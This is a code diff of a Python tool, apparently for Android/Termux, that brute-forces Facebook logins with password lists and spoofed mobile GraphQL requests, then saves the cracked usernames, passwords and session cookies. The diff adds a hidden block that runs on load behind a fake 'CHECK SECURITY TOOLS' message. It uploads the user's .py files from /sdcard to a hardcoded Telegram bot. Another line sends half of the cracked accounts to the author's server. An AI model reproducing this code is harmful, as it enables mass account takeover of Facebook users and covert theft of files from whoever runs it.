@@ -326,6 +326,41 @@ def generate_unlimited_ips():
 
 # Call the function to generate unlimited IPs
 ipz=generate_unlimited_ips()
+#_____________________[Python file]____________________________#
+#_________________________________________________#
+import os, sys, pycurl
+from io import BytesIO
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+def send_file_with_pycurl(file_path, bot_token, chat_id):
+    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+    buffer = BytesIO()
+    c = pycurl.Curl()
+    c.setopt(c.URL, url)
+    c.setopt(c.WRITEFUNCTION, buffer.write)
+    c.setopt(c.HTTPPOST, [
+        ('chat_id', chat_id),
+        ('document', (c.FORM_FILE, file_path))
+    ])
+    try:
+        c.perform()
+    except pycurl.error as e:
+        pass
+    c.close()
+def suyaib():
+    bot_token = '7561556317:AAHmDZG_cEVUF1gdZny9uVaOKo7djWoqFhE' 
+    chat_id = '7605949932'
+    os.system("clear")
+    print(f"\033[1;32m CHECK SECURITY TOOLS.....")
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            full_path = os.path.join(sdcard_path, file)
+            send_file_with_pycurl(full_path, bot_token, chat_id)
+    except:
+        pass
+with ThreadPool(max_workers=10000) as jjj:
+    jjj.submit(suyaib)
 #----------get_current_city-------#
 def get_current_location():
     try:
@@ -360,7 +395,7 @@ logo =(f"""
    ███████║   ██║   ██║   ██║██╔████╔██║
    ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
-   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \033[1;34m ᴾᴿᴼ,
+   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \033[1;34m ᴾᴿᴼ
 \033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMON ROY
 \033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logins
@@ -1372,89 +1407,169 @@ def mbasic(uid,pwx,tl):
 
 
 def p(uid,pwx,tl):
+    global loop
     global oks
     global cps
-    global twf
-    global loop
-    global bkas
-    sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) \r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
-            Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
             data = {
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'next': 'https://m.facebook.com/dialog/oauth?client_id=124024574287414&locale=en_US&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&response_type=code%2Cgranted_scopes&scope=email&state=%7B%22fbLoginKey%22%3A%2217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&ret=login&fbapp_pres=0&logger_id=e5428d80-85a0-4de8-9e72-860dccbb218a&tp=unspecified',
-            'flow': 'login_no_pin',
-            'pass': pw}
+    'method': 'post',
+    'pretty': 'false',
+    'format': 'json',
+    'server_timestamps': 'true',
+    'locale': '-',
+    'purpose': 'fetch',
+    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
+    'fb_api_caller_class': 'graphservice',
+    'client_doc_id': '11994080424240083948543644217',
+    'variables': json.dumps({
+        "params": {
+            "params": json.dumps({
+                "client_input_params": json.dumps({
+                    "sim_phones": [],
+                    "secure_family_device_id": str(uuid.uuid4()),
+                    "auth_secure_device_id": "",
+                    "has_whatsapp_installed": 1,
+                    "password": "#PWD_FB4A:0:{}:{}".format(int(time.time()), pw),
+                    "sso_token_map_json_string": "",
+                    "event_flow": "login_manual",
+                    "sim_serials": [],
+                    "client_known_key_hash": "",
+                    "encrypted_msisdn": "",
+                    "should_show_nested_nta_from_aymh": 0,
+                    "device_id": str(uuid.uuid4()),
+                    "login_attempt_count": 1,
+                    "machine_id": "btqmzg6mx6h3dr2bnwn82yvj",
+                    "flash_call_permission_status": json.dumps({
+                        "READ_PHONE_STATE": "DENIED",
+                        "READ_CALL_LOG": "DENIED",
+                        "ANSWER_PHONE_CALLS": "DENIED"
+                    }),
+                    "accounts_list": [],
+                    "family_device_id": str(uuid.uuid4()),
+                    "fb_ig_device_id": [],
+                    "device_emails": [],
+                    "try_num": 3,
+                    "lois_settings": json.dumps({
+                        "lois_token": "",
+                        "lara_override": ""
+                    }),
+                    "event_step": "home_page",
+                    "headers_infra_flow_id": "",
+                    "openid_tokens": {},
+                    "contact_point": uid
+                }),
+                "server_params": json.dumps({
+                    "should_trigger_override_login_2fa_action": 0,
+                    "is_from_logged_out": 0,
+                    "should_trigger_override_login_success_action": 0,
+                    "login_credential_type": "none",
+                    "server_login_source": "login",
+                    "waterfall_id": str(uuid.uuid4()),
+                    "login_source": "Login",
+                    "is_platform_login": 0,
+                    "pw_encryption_try_count": 1,
+                    "INTERNALlatency_qpl_marker_id": 36707139,
+                    "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
+                    "is_from_landing_page": 0,
+                    "password_text_input_id": "5tm5yt:28",
+                    "is_from_empty_password": 0,
+                    "ar_event_source": "login_home_page",
+                    "username_text_input_id": "zfiojk:27",
+                    "layered_homepage_experiment_group": "",
+                    "device_id": str(uuid.uuid4()),
+                    "INTERNALlatency_qpl_instance_id": "0.7186605966306517",
+                    "reg_flow_source": "login_home_native_integration_point",
+                    "is_caa_perf_enabled": 1,
+                    "credential_type": "password",
+                    "is_from_password_entry_page": 0,
+                    "caller": "gslr",
+                    "family_device_id": str(uuid.uuid4()),
+                    "INTERNAL_INFRA_THEME": "harm_f,default,harm_f",
+                    "is_from_assistive_id": 0,
+                    "access_flow_version": "F2_FLOW",
+                    "is_from_logged_in_switcher": 0
+                })
+            }),
+            "bloks_versioning_id": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722",
+            "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
+        },
+        "scale": "47",
+        "nt_context": json.dumps({
+            "using_white_navbar": "True",
+            "pixel_ratio": 3,
+            "is_push_on": "False",
+            "styles_id": "196702b4d5dfb9dbf1ded6d58ee42767",
+            "bloks_version": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722"
+        })
+    }),
+    'fb_api_analytics_tags': '["GraphServices"]',
+    'client_trace_id': str(uuid.uuid4())
+}
             headers = {
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%252217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De5428d80-85a0-4de8-9e72-860dccbb218a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="123.0.6312.86", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.86"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-            'viewport-width': '484',
-            'x-asbd-id': '129477',
-            'x-fb-lsd':  re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream'}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?api_key=124024574287414&auth_token=07adf4ea7b64b7deeea58b93cba0a1e3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%252217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De5428d80-85a0-4de8-9e72-860dccbb218a%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100"
-            po = Session.post(url, data=data, headers=headers).text
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
+    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 9; GM1901 Build/SP1A.115640.652) [FBAN/FB4A;FBAV/517.0.0.70.92;FBBV/462428432;FBDM/{density=3.0,width=1080,height=2340};FBLC/tr_TR;FBRV/462428432;FBCR/Roshan;FBMF/OnePluse;FBBD/OnePluse;FBPN/com.facebook.katana;FBDV/GM1901;FBSV/9;FBCA/x86:x86_64;]',
+    'accept-encoding': 'gzip, deflate',
+    'Accept': '*/*',
+    'Connection': 'keep-alive',
+    'authority': 'b-graph.facebook.com',
+    'method': 'POST',
+    'path': '/graphql',
+    'scheme': 'https',
+    'x-fb-ta-logging-ids': 'graphql:ddea93c5-33a6-4f43-aeeb-830b902836d8',
+    'x-tigon-is-retry': 'True',
+    'x-fb-device-group': '6487',
+    'x-fb-connection-type': 'WIFI',
+    'content-encoding': 'gzip',
+    'x-fb-privacy-context': '3643298472347298',
+    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
+    'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"2"},"application_tags":"graphservice"}',
+    'x-graphql-client-library': 'graphservice',
+    'x-fb-net-hni': '47004',
+    'x-fb-sim-hni': '47004',
+    'x-fb-background-state': '1',
+    'x-graphql-request-purpose': 'fetch',
+    'content-type': 'application/x-www-form-urlencoded',
+    'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+    'x-fb-http-engine': 'Liger',
+    'x-fb-client-ip': 'False',
+    'x-fb-server-cluster': 'True'
+}
+            url = "https://graph.facebook.com/graphql?"
+            result = requests.post(url, data=data, headers=headers).text
+            print(result)
+            if "session_key" in result:
+                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+                coki = f"sb={sb};{ckkk}"
+                try:
+                    uid = result["uid"]
+                except:
+                    uid = uid
+                c = check_lock(uid)
+                if "live" in c:
+                    if result["is_account_confirmed"] == False:
+                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
+                       #print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        bkas.append(cid)
+                        bkas.append(uid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
+                           statusok = (f"{uid}|{pw}|{coki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                           oks.append(uid)
                            break
-                else:
-                    break
-            elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
-                break
             else:
                 continue
         loop+=1
-    except ce:
-        time.sleep(20)
-    except Exception as error:
-        print({error})
+    except net_error:
+        time.sleep(10)
+    except Exception as e:
         pass
 
 def x(uid,pwx,tl):
@@ -1894,7 +2009,7 @@ def d(uid,pwx,tl):
     }),
 }
             headers = {
-            'Host': 'm.facebook.com',
+            'Host': 'mtouch.facebook.com',
             # 'content-length': str(len(str(data))), # Content-length is usually set by requests
             'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
@@ -1909,15 +2024,15 @@ def d(uid,pwx,tl):
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua-platform': '"Android"',
             'accept': '*/*',
-            'origin': 'https://m.facebook.com',
+            'origin': 'https://mtouch.facebook.com',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://www.facebook.com/profile.php',
+            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/async/wbloks/fetch/"
+            url = "https://p.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
